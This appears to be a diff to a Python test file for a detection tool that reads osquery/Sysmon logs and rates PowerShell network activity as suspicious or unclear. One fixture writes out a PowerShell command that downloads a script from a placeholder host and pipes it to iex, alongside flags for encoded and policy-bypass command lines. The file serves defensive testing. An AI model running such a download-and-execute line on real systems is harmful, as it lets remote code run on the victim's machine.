@@ -536,8 +536,10 @@ GUID = "{aaaaaaaa-0000-0000-0000-000000000001}"
 def sysmon_log(tmp_path, parent="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"):
     log = tmp_path / "osqueryd.results.log"
     log.write_text("\n".join(json.dumps(r) for r in [
-        sysmon(1, T0 - 30, guid=GUID, path=PS, parent_path=parent,
-               cmdline="powershell -NoProfile -Command iwr https://dl.example/a.ps1 -Headers @{token='hunter2'}"),
+        # as osquery logs it: signals computed, raw text kept because a suspicious one (dl, iex) fired
+        sysmon(1, T0 - 30, guid=GUID, path=PS, parent_path=parent, cmd_dl="1", cmd_iex="1", cmd_url="1",
+               cmdline="powershell -c (New-Object Net.WebClient).DownloadString('https://dl.example/a') | iex"
+                       " ; $h=@{token='hunter2'}"),
         sysmon(3, T0 + 1, guid=GUID, path=PS, remote_address=DST, remote_port="443"),
         sysmon(22, T0, guid=GUID, path=PS, query="dl.example"),
     ]))
@@ -586,3 +588,22 @@ def test_pseudo_processes_are_not_listed_as_programs(tmp_path):
     hc = HostContext(PC, None, [log], str(tmp_path / "t"), runner=FakeRunner([]))
     facts = hc.collect(case(indicators=[]), [out_conn(T0)], [], now=T0 + 3600)
     assert facts["host_programs"] == ["chrome.exe"]
+
+
+def test_command_line_signals_without_raw_text(tmp_path):
+    """Benign command lines never reach the log; osquery's signals still feed the assessment."""
+    log = tmp_path / "osqueryd.results.log"
+    rows = [sysmon(1, T0 - 30, guid="{g1}", path=PS, parent_path="C:\\Windows\\explorer.exe", cmd_enc="1"),
+            sysmon(3, T0, guid="{g1}", path=PS, remote_address=DST, remote_port="443"),
+            sysmon(1, T0 - 30, guid="{g2}", path=PS, parent_path="C:\\Windows\\explorer.exe", cmd_hidden="1",
+                   cmd_bypass="1"),
+            sysmon(3, T0, guid="{g2}", path=PS, remote_address=DST, remote_port="8443")]
+    log.write_text("\n".join(json.dumps(r) for r in rows))
+    idx = OwnerIndex()
+    idx.read_log(log, since=0)
+    idx.resolve()
+    (enc,) = idx.who(DST, 443, T0)
+    assert enc.cmdline == "" and enc.cmd_flags == ("enc",)
+    assert assess([enc], "other_program") == ("suspicious", ["powershell.exe's command line has an encoded payload"])
+    (hidden,) = idx.who(DST, 8443, T0)
+    assert assess([hidden], "other_program")[0] == "unclear"
